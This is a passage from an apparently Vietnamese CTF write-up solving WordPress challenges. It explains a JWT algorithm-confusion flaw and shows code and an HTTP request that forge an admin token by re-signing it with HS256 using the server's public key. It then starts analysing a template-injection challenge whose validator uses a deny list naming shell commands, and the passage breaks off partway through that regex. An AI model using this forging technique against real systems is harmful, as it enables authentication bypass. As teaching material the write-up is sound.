</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>simple_jwt_handler</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$flag</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;/flag.txt&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$privateKey</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;/jwt.key&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$publicKey</span> <span class=o>=</span> <span class=s>&lt;&lt;&lt;</span><span class=dl>EOD</span><span class=s>
</span></span></span><span class=line><span class=cl><span class=s>    -----BEGIN PUBLIC KEY-----
</span></span></span><span class=line><span class=cl><span class=s>    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqXfQ7ExnjmPJbSwuFoxw
</span></span></span><span class=line><span class=cl><span class=s>    3kuBeE716YM5uXirwUb0OWB5RfACAx9yulBQJorcQIUdeRf+YpkQU5U8h3jVyeqw
</span></span></span><span class=line><span class=cl><span class=s>    HzjOjNjM00CVFeogTnueHoose7Jcdi/K3NyYcFQINui7b6cGab8hMl6SgctwZu1l
</span></span></span><span class=line><span class=cl><span class=s>    G0bk0VcqgafWFqSfIYZYw57GYhMnfPe7OR0Cvv1HBCD2nWYilDp/Hq3WUkaMWGsG
</span></span></span><span class=line><span class=cl><span class=s>    UBMSNpC2C/3CzGOBV8tHWAUA8CFI99dHckMZCFJlKMWNQUQlTlF3WB1PnDNL4EPY
</span></span></span><span class=line><span class=cl><span class=s>    YC+8DqJDSLCvFwI+DeqXG4B/DIYdJyhEgMdZfAKSbMJtsanOVjBLJx4hrNS42RNU
</span></span></span><span class=line><span class=cl><span class=s>    dwIDAQAB
</span></span></span><span class=line><span class=cl><span class=s>    -----END PUBLIC KEY-----
</span></span></span><span class=line><span class=cl><span class=s>    </span><span class=dl>EOD</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$issuedAt</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DateTimeImmutable</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nv>$data</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;role&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;guest&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;iat&#34;</span> <span class=o>=&gt;</span> <span class=nv>$issuedAt</span><span class=o>-&gt;</span><span class=na>getTimestamp</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;nbf&#34;</span> <span class=o>=&gt;</span> <span class=nv>$issuedAt</span><span class=o>-&gt;</span><span class=na>getTimestamp</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;simple_jwt&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>setcookie</span><span class=p>(</span><span class=s1>&#39;simple_jwt&#39;</span><span class=p>,</span> <span class=nx>SimpleJWTHandler</span><span class=o>::</span><span class=na>encodeToken</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=nv>$privateKey</span><span class=p>,</span> <span class=s1>&#39;RS256&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s1>&#39;JWT has been set.&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$token</span> <span class=o>=</span> <span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;simple_jwt&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$decoded</span> <span class=o>=</span> <span class=nx>SimpleJWTHandler</span><span class=o>::</span><span class=na>decodeToken</span><span class=p>(</span><span class=nv>$token</span><span class=p>,</span> <span class=nv>$publicKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nv>$decoded</span><span class=o>-&gt;</span><span class=na>role</span> <span class=o>==</span> <span class=s1>&#39;admin&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>echo</span> <span class=s1>&#39;Success: &#39;</span> <span class=o>.</span> <span class=nv>$flag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nv>$decoded</span><span class=o>-&gt;</span><span class=na>role</span> <span class=o>==</span> <span class=s1>&#39;guest&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>echo</span> <span class=s1>&#39;Role is guest.&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>Exception</span> <span class=nv>$e</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s1>&#39;Token verification failed.&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Khi gá»­i yÃªu cáº§u tá»›i <code>wp-ajax.php</code> vá»›i <code>action=simple_jwt_handler</code>, náº¿u khÃ´ng cÃ³ giÃ¡ trá»‹ <code>$_COOKIE['simple_jwt']</code>, plugin sáº½ tráº£ vá» má»™t JWT vá»›i <code>role=guest</code>, Ä‘Æ°á»£c mÃ£ hÃ³a báº±ng thuáº­t toÃ¡n <code>RS256</code>. Do chÃºng ta khÃ´ng biáº¿t Ä‘Æ°á»£c <code>private.key</code>, nÃªn viá»‡c chá»‰nh sá»­a JWT Ä‘á»ƒ chuyá»ƒn tá»« <code>role=guest</code> sang <code>role=admin</code> lÃ  khÃ´ng kháº£ thi.</p><p>Tiáº¿p theo, hÃ£y kiá»ƒm tra hÃ m <code>SimpleJWTHandler::decodeToken($token, $publicKey)</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>decodeToken</span><span class=p>(</span><span class=nv>$token</span><span class=p>,</span> <span class=nv>$key</span> <span class=o>=</span> <span class=k>null</span><span class=p>,</span> <span class=nv>$verify</span> <span class=o>=</span> <span class=k>true</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$segments</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>,</span> <span class=nv>$token</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>count</span><span class=p>(</span><span class=nv>$segments</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=nx>UnexpectedValueException</span><span class=p>(</span><span class=s1>&#39;Invalid token structure&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>list</span><span class=p>(</span><span class=nv>$header64</span><span class=p>,</span> <span class=nv>$payload64</span><span class=p>,</span> <span class=nv>$signature64</span><span class=p>)</span> <span class=o>=</span> <span class=nv>$segments</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$header</span> <span class=o>=</span> <span class=nx>self</span><span class=o>::</span><span class=na>jsonDecode</span><span class=p>(</span><span class=nx>self</span><span class=o>::</span><span class=na>urlSafeBase64Decode</span><span class=p>(</span><span class=nv>$header64</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$payload</span> <span class=o>=</span> <span class=nx>self</span><span class=o>::</span><span class=na>jsonDecode</span><span class=p>(</span><span class=nx>self</span><span class=o>::</span><span class=na>urlSafeBase64Decode</span><span class=p>(</span><span class=nv>$payload64</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$signature</span> <span class=o>=</span> <span class=nx>self</span><span class=o>::</span><span class=na>urlSafeBase64Decode</span><span class=p>(</span><span class=nv>$signature64</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$verify</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$header</span><span class=o>-&gt;</span><span class=na>alg</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=nx>DomainException</span><span class=p>(</span><span class=s1>&#39;Algorithm missing&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>is_array</span><span class=p>(</span><span class=nv>$key</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$header</span><span class=o>-&gt;</span><span class=na>kid</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$key</span> <span class=o>=</span> <span class=nv>$key</span><span class=p>[</span><span class=nv>$header</span><span class=o>-&gt;</span><span class=na>kid</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=nx>DomainException</span><span class=p>(</span><span class=s1>&#39;Key ID missing&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>self</span><span class=o>::</span><span class=na>verifySignature</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$header64</span><span class=s2>.</span><span class=si>$payload64</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nv>$signature</span><span class=p>,</span> <span class=nv>$key</span><span class=p>,</span> <span class=nv>$header</span><span class=o>-&gt;</span><span class=na>alg</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=nx>UnexpectedValueException</span><span class=p>(</span><span class=s1>&#39;Signature verification failed&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$payload</span><span class=o>-&gt;</span><span class=na>exp</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>time</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=nv>$payload</span><span class=o>-&gt;</span><span class=na>exp</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=nx>UnexpectedValueException</span><span class=p>(</span><span class=s1>&#39;Token expired&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$payload</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ChÃºng ta tháº¥y ráº±ng hÃ m <code>decodeToken</code> sá»­ dá»¥ng <code>$token</code> vÃ  <code>$publicKey</code> Ä‘á»ƒ xÃ¡c thá»±c JWT. Tuy nhiÃªn, cÃ³ má»™t lá»— há»•ng á»Ÿ Ä‘Ã¢y: thuáº­t toÃ¡n mÃ£ hÃ³a JWT (<code>alg</code>) khÃ´ng Ä‘Æ°á»£c cá»‘ Ä‘á»‹nh mÃ  Ä‘Æ°á»£c láº¥y tá»« header cá»§a JWT mÃ  ngÆ°á»i dÃ¹ng gá»­i vÃ o. Äiá»u nÃ y cho phÃ©p chÃºng ta thay Ä‘á»•i thuáº­t toÃ¡n mÃ£ hÃ³a tá»« <code>RS256</code> sang <code>HS256</code>. Vá»›i <code>HS256</code>, JWT sáº½ sá»­ dá»¥ng <code>publicKey</code> cá»§a server lÃ m khÃ³a bÃ­ máº­t Ä‘á»ƒ mÃ£ hÃ³a thay vÃ¬ <code>privateKey</code>.</p><p>Äiá»u nÃ y cÃ³ nghÄ©a lÃ  chÃºng ta cÃ³ thá»ƒ giáº£ máº¡o JWT vá»›i <code>role=admin</code> báº±ng cÃ¡ch sá»­ dá»¥ng thuáº­t toÃ¡n <code>HS256</code> vÃ  kÃ½ láº¡i JWT báº±ng <code>publicKey</code> mÃ  server Ä‘Ã£ cung cáº¥p.</p><p>Vá»›i lá»— há»•ng Ä‘Ã£ phÃ¡t hiá»‡n, chÃºng ta chá»‰ cáº§n chá»‰nh sá»­a má»™t chÃºt á»Ÿ pháº§n mÃ£ hÃ³a JWT Ä‘á»ƒ cÃ³ thá»ƒ táº¡o ra má»™t JWT vá»›i <code>role=admin</code>. Thay vÃ¬ sá»­ dá»¥ng thuáº­t toÃ¡n <code>RS256</code>, chÃºng ta sáº½ chuyá»ƒn sang sá»­ dá»¥ng <code>HS256</code> vÃ  kÃ½ láº¡i JWT báº±ng <code>publicKey</code> mÃ  server Ä‘Ã£ cung cáº¥p.</p><p>DÆ°á»›i Ä‘Ã¢y lÃ  Ä‘oáº¡n code Ä‘Ã£ Ä‘Æ°á»£c chá»‰nh sá»­a:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$data</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;role&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;admin&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;iat&#34;</span> <span class=o>=&gt;</span> <span class=nv>$issuedAt</span><span class=o>-&gt;</span><span class=na>getTimestamp</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;nbf&#34;</span> <span class=o>=&gt;</span> <span class=nv>$issuedAt</span><span class=o>-&gt;</span><span class=na>getTimestamp</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;simple_jwt&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>setcookie</span><span class=p>(</span><span class=s1>&#39;simple_jwt&#39;</span><span class=p>,</span> <span class=nx>SimpleJWTHandler</span><span class=o>::</span><span class=na>encodeToken</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=nv>$publicKey</span><span class=p>,</span> <span class=s1>&#39;HS256&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;JWT has been set.&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Vá»›i Ä‘oáº¡n mÃ£ nÃ y, chÃºng ta Ä‘Ã£ táº¡o Ä‘Æ°á»£c má»™t JWT vá»›i <code>role=admin</code>, sá»­ dá»¥ng thuáº­t toÃ¡n <code>HS256</code> vÃ  <code>publicKey</code> tá»« server Ä‘á»ƒ kÃ½ láº¡i JWT. Sau khi cÃ³ Ä‘Æ°á»£c JWT nÃ y tá»« mÃ´i trÆ°á»ng local, chá»‰ cáº§n gá»­i JWT lÃªn server báº±ng cÃ¡ch Ä‘Ã­nh kÃ¨m nÃ³ vÃ o <code>Cookie</code>, vÃ  gá»­i má»™t request tá»›i server. Náº¿u token Ä‘Ã£ Ä‘Æ°á»£c chá»‰nh sá»­a Ä‘Ãºng cÃ¡ch, server sáº½ xÃ¡c thá»±c JWT vá»›i <code>role=admin</code> vÃ  tráº£ vá» flag.</p><p>Cá»¥ thá»ƒ, sau khi cÃ³ JWT, báº¡n chá»‰ cáº§n POST nÃ³ lÃªn server thÃ´ng qua:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/wp-ajax.php?action=simple_jwt_handler</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>simple_jwt=&lt;JWT Ä‘Ã£ chá»‰nh sá»­a&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>Váº­y lÃ  báº¡n sáº½ nháº­n Ä‘Æ°á»£c flag</p><h1 id=timberlake>Timberlake<a hidden class=anchor aria-hidden=true href=#timberlake>#</a></h1><p><img loading=lazy src=https://images.viblo.asia/15498c71-f7ec-4fea-ab71-8bc80c5d349a.png alt=image.png></p><p>Äá» bÃ i cung cáº¥p má»™t theme WordPress vá»›i file <code>index.php</code> Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ hiá»ƒn thá»‹ ná»™i dung trang. á» pháº§n nÃ y, Ä‘iá»ƒm cáº§n chÃº Ã½ lÃ  tham sá»‘ <code>page</code> Ä‘Æ°á»£c truyá»n qua URL, vÃ  sau Ä‘Ã³ ná»™i dung Ä‘Æ°á»£c render thÃ´ng qua <code>Timber::render($page, $context)</code>. Tuy nhiÃªn, Ä‘á»ƒ cÃ³ thá»ƒ render file template thÃ nh cÃ´ng, tham sá»‘ <code>page</code> pháº£i qua hÃ m <code>validate($_REQUEST['page'])</code>. DÆ°á»›i Ä‘Ã¢y, tÃ´i sáº½ giáº£i thÃ­ch chi tiáº¿t hÆ¡n cÃ¡c bÆ°á»›c xá»­ lÃ½ vÃ  cÃ¡c cÆ¡ cháº¿ báº£o vá»‡ cá»§a Ä‘oáº¡n mÃ£ nÃ y.</p><h3 id=giáº£i-thÃ­ch-chi-tiáº¿t-cÃ¡c-pháº§n-quan-trá»ng>Giáº£i thÃ­ch chi tiáº¿t cÃ¡c pháº§n quan trá»ng:<a hidden class=anchor aria-hidden=true href=#giáº£i-thÃ­ch-chi-tiáº¿t-cÃ¡c-pháº§n-quan-trá»ng>#</a></h3><ol><li><p><strong>CÆ¡ cháº¿ xÃ¡c Ä‘á»‹nh template:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$page</span> <span class=o>=</span> <span class=s1>&#39;template-home.twig&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;page&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>validate</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;page&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$page</span> <span class=o>=</span> <span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;page&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>Trong Ä‘oáº¡n nÃ y, biáº¿n <code>$page</code> sáº½ nháº­n giÃ¡ trá»‹ tá»« tham sá»‘ <code>page</code> trong request náº¿u hÃ m <code>validate()</code> tráº£ vá» true. Náº¿u khÃ´ng, máº·c Ä‘á»‹nh template Ä‘Æ°á»£c sá»­ dá»¥ng lÃ  <code>template-home.twig</code>. Äiá»u nÃ y cÃ³ nghÄ©a ráº±ng Ä‘á»ƒ render má»™t file khÃ¡c, giÃ¡ trá»‹ cá»§a tham sá»‘ <code>page</code> pháº£i thá»a mÃ£n cÃ¡c Ä‘iá»u kiá»‡n kiá»ƒm tra trong hÃ m <code>validate()</code>.</p></li><li><p><strong>HÃ m <code>validate()</code>:</strong>
ÄÃ¢y lÃ  hÃ m kiá»ƒm tra quan trá»ng Ä‘á»ƒ Ä‘áº£m báº£o file Ä‘Æ°á»£c truyá»n qua tham sá»‘ <code>page</code> an toÃ n vÃ  há»£p lá»‡. CÃ¡c bÆ°á»›c kiá»ƒm tra bao gá»“m:</p><ul><li><p><strong>Kiá»ƒm tra tÃªn file:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$filename</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$filename</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$filename</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;.php&#39;</span><span class=p>,</span> <span class=s1>&#39;.htm&#39;</span><span class=p>,</span> <span class=s1>&#39;.html&#39;</span><span class=p>,</span> <span class=s1>&#39;.phtml&#39;</span><span class=p>,</span> <span class=s1>&#39;.xhtml&#39;</span><span class=p>)))</span> <span class=p>{</span>
</span></span></code></pre></td></tr></table></div></div><p>TÃªn file pháº£i khÃ´ng rá»—ng vÃ  khÃ´ng Ä‘Æ°á»£c náº±m trong danh sÃ¡ch cÃ¡c file cÃ³ pháº§n má»Ÿ rá»™ng nguy hiá»ƒm nhÆ° <code>.php</code>, <code>.htm</code>, <code>.html</code>, v.v. Äiá»u nÃ y giÃºp ngÄƒn cháº·n viá»‡c sá»­ dá»¥ng cÃ¡c file cÃ³ kháº£ nÄƒng thá»±c thi mÃ£ Ä‘á»™c.</p></li><li><p><strong>Kiá»ƒm tra ná»™i dung file:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>is_timber_template</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$fullPath</span><span class=p>))</span> <span class=o>===</span> <span class=k>true</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>is_valid_template</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$fullPath</span><span class=p>))</span> <span class=o>===</span> <span class=k>true</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>             
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Sau khi xÃ¡c Ä‘á»‹nh ráº±ng tÃªn file há»£p lá»‡, ná»™i dung cá»§a file sáº½ Ä‘Æ°á»£c Ä‘á»c vÃ  kiá»ƒm tra qua hai hÃ m <code>is_timber_template()</code> vÃ  <code>is_valid_template()</code> Ä‘á»ƒ Ä‘áº£m báº£o ráº±ng file khÃ´ng chá»©a cÃ¡c Ä‘oáº¡n mÃ£ nguy hiá»ƒm.</p></li></ul></li><li><p><strong>HÃ m <code>is_timber_template()</code>:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>is_timber_template</span><span class=p>(</span><span class=nv>$content</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$pattern</span> <span class=o>=</span> <span class=s1>&#39;/({{.*?}}|{%.*?%}|{#.*?#})/&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=nv>$pattern</span><span class=p>,</span> <span class=nv>$content</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>HÃ m nÃ y kiá»ƒm tra xem file cÃ³ chá»©a cÃ¡c biá»ƒu thá»©c liÃªn quan Ä‘áº¿n Timber template engine (nhÆ° <code>{{ }}</code>, <code>{% %}</code>, hoáº·c <code>{# #}</code>). Náº¿u file cÃ³ chá»©a cÃ¡c Ä‘oáº¡n mÃ£ nÃ y, nÃ³ Ä‘Æ°á»£c coi lÃ  má»™t template há»£p lá»‡ Ä‘á»ƒ Timber cÃ³ thá»ƒ render.</p></li><li><p><strong>HÃ m <code>is_valid_template()</code>:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>is_valid_template</span><span class=p>(</span><span class=nv>$content</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$pattern</span> <span class=o>=</span> <span class=s1>&#39;/\b(filter|system|cat|bash|bin|exec|_self|env|dump|app|sort|tac|file_excerpt|\/bin|FILENAME)\b/i&#39;</span><span class=p>;</span>
